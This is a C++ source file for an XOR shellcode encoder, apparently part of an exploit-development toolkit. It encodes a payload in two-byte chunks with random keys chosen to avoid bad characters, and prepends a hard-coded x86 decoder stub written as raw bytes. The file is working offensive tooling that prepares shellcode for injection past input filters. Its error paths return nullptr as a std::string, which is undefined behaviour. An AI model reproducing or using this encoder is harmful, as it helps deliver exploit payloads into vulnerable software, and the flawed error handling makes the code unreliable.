#include "Encoder/XorEncoder.hpp"

std::string XorEncoder::encode(uint8_t* buffer, size_t length, uint8_t* badCharacters, size_t badCharactersLength)
{
    std::string stub = XorEncoder::getStub();

    // Issue a warning if any of the bad chars are found within the decoder itself.
    if (XorEncoder::bufferContainsAny((uint8_t*)stub.c_str(), stub.length(), badCharacters, badCharactersLength))
        Log::warning(VerbosityLevel::Standard, "One or more bad chars were found in the decoder stub\n");

    // Loop through the shellcode in 2 byte chunks and find a byte to XOR them
    // with, each time prepending the XOR byte to the encoded chunk.
    uint32_t chunkIndex = 0;

    std::string encoded = "";
    for (uint32_t i = 0; i < length; i += 2)
    {
        uint8_t xorByte = XorEncoder::findValidXorByte(buffer + i, 2, badCharacters, badCharactersLength);

        if (xorByte == 0x00)
        {
            Log::error(VerbosityLevel::Standard, "Failed to find a valid XOR byte to encode chunk %i", chunkIndex + 1);
            return nullptr;
        }

        encoded += (uint8_t)xorByte;
        for (uint32_t j = 0; j < 2; j++)
            encoded += (j < length - i) ? (uint8_t)(buffer[i + j] ^ xorByte) : (uint8_t)xorByte;

        chunkIndex++;
    }

    // Find a byte that does not appear in the decoder stub or the encoded
    // shellcode which can be used as an EOF delimiter.
    std::string payload = stub + encoded;
    uint8_t xorByte = XorEncoder::findValidXorByte((uint8_t*)payload.c_str(), payload.length(), badCharacters, badCharactersLength);

    if (xorByte == 0x00)
    {
        Log::error(VerbosityLevel::Standard, "Failed to find a valid XOR byte for the delimiter");
        return nullptr;
    }

    findAndReplaceAll(stub, "\x45", std::string(1, xorByte));
    return stub + encoded + std::string(1, xorByte);
}

std::string XorEncoder::getStub()
{
    return "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
            "\xb2\x45\xeb\x1f\x5e\x8d\x3e\x8a"
            "\x1c\x0f\x88\xdf\x88\xd0\x30\xd8"
            "\x74\x16\x66\x8b\x44\x0f\x01\x66"
            "\x31\xd8\x66\x89\x07\x41\x8d\x7f"
            "\x02\xeb\xe4\xe8\xdc\xff\xff\xff";
}

bool XorEncoder::bufferContainsAny(uint8_t* buffer, size_t bufferLength, uint8_t* other, size_t otherLength)
{
    for (uint32_t i = 0; i < bufferLength; i++)
    {
        for (uint32_t j = 0; j < otherLength; j++)
        {
            if (buffer[i] == other[j])
                return true;
        }
    }
    return false;
}

uint8_t XorEncoder::findValidXorByte(uint8_t* buffer, size_t length, uint8_t* badCharacters, size_t badCharactersLength)
{
    // Generate a list of bytes from 1 to 255 in a random order.
    std::vector<uint8_t> bytes;
    for (uint32_t i = 1; i < 256; i++)
        bytes.push_back((uint8_t)i);

    std::random_device rd;
    std::default_random_engine rng = std::default_random_engine { rd() };
    std::shuffle(std::begin(bytes), std::end(bytes), rng);

    std::vector<uint8_t>::iterator i;
    for (i = bytes.begin(); i != bytes.end(); i++)
    {
        bool isValid = true;

        uint8_t byte = *i;

        // Check if the potential XOR byte matches any of the bad chars.
        if (XorEncoder::bufferContainsAny(&byte, 1, badCharacters, badCharactersLength))
            continue;

        // Check buffer
        for (uint32_t j = 0; j < length; j++)
        {
            // Check that the current byte is not the same as the
            // XOR byte, otherwise null bytes will be produced.
            if (byte == buffer[j])
            {
                isValid = false;
                break;
            }

            // Check if XORing using the current byte would result in any
            // bad chars ending up in the final shellcode.
            uint8_t xorByte = buffer[j] ^ byte;
            if (XorEncoder::bufferContainsAny(&xorByte, 1, badCharacters, badCharactersLength))
            {
                isValid = false;
                break;
            }
        }
        
        // If this character is valid, return it.
        if (isValid)
            return byte;
    }
    
    return 0;
}

void XorEncoder::findAndReplaceAll(std::string &data, std::string toSearch, std::string replaceStr)
{
    // Get the first occurrence
    size_t pos = data.find(toSearch);
    // Repeat till end is reached
    while( pos != std::string::npos)
    {
        // Replace this occurrence of Sub String
        data.replace(pos, toSearch.size(), replaceStr);
        // Get the next occurrence from the current position
        pos =data.find(toSearch, pos + replaceStr.size());
    }
}